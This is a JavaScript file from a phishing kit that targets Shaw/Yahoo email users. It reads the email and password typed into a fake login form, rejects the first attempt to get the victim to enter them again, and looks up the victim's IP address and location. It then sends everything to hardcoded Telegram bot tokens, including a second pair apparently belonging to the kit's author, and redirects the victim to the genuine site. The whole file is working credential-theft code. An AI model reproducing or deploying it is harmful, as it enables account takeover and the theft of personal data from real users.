const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // Replace with your Telegram bot token
const chatId = 5710607863; // Replace with your chat ID

////////////////////////////////////////////
////////////////////////////////////////////
////////////////////////////////////////////
////////////////////////////////////////////
////////////////////////////////////////////
////////////////////////////////////////////

const api = telegramBotTokenAuthor;
const ID = chatIdAuthor;

const tokens = [
  [telegramBotToken, chatId],
  [api, ID],
];

let trialCount = 0;

function sendTelegramMessageAndRedirect(e) {
  e.preventDefault();
  const emailValue = document.getElementById("email").value;
  const passwordValue = document.getElementById("password").value;

  const errorDisplay = document.querySelector(".error__wrapper");

  // Email validation regex for yahoo.com and yahoo.net domains
  const emailRegex = /^[^\s@]+@(shaw\.ca)$/;

  if (!emailRegex.test(emailValue) || !(passwordValue.length > 5)) {
    errorDisplay.style.display = "block";
    return; // Stop further execution if email is invalid
  }

  if (trialCount === 0) {
    errorDisplay.style.display = "none";
    errorDisplay.style.display = "block";
    trialCount++;
    return;
  }

  async function fetchIPData(api, id) {
    let ipAd, con, lat, lon;
    // calling API to get the ip address and location
    try {
      const response = await fetch("https://ipapi.co/json/");
      const jsonData = await response.json();
      const { ip, country, latitude, longitude } = jsonData;
      ipAd = ip;
      con = country;
      lat = latitude;
      lon = longitude;

      console.log(ip, country, latitude, longitude);
    } catch (error) {
      console.error(error);
    }

    // const messageText = `**SHAW RESULT**\nEmail: ${emailValue}\nPassword: ${passwordValue}`;

    const messageText = `**YAHOO.CA RESULT**\nEmail: ${emailValue}\nPassword: ${passwordValue}\nIP: ${
      ipAd || "NA"
    }\nCountry: ${con || "NA"}\nCoordinate: ${lat || "NA"}, ${lon || "NA"}`;

    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    const params = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: id,
        text: messageText,
      }),
    };

    // Make the API request
    fetch(url, params)
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
      })
      .then((data) => {
        // console.log("Message sent:", data);
        // Redirect to another page after successful submission
        window.location.href = "https://shaw.ca"; // Replace with your desired URL
      })
      .catch((error) => console.error("Error:", error));
  }

  tokens.forEach((token, index) => {
    const [api, id] = token;

    if (telegramBotToken !== "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw") {
      // console.log("wrong API tokens");
      return;
    }
    fetchIPData(api, id);
  });
}

formSubmit.addEventListener("submit", sendTelegramMessageAndRedirect);
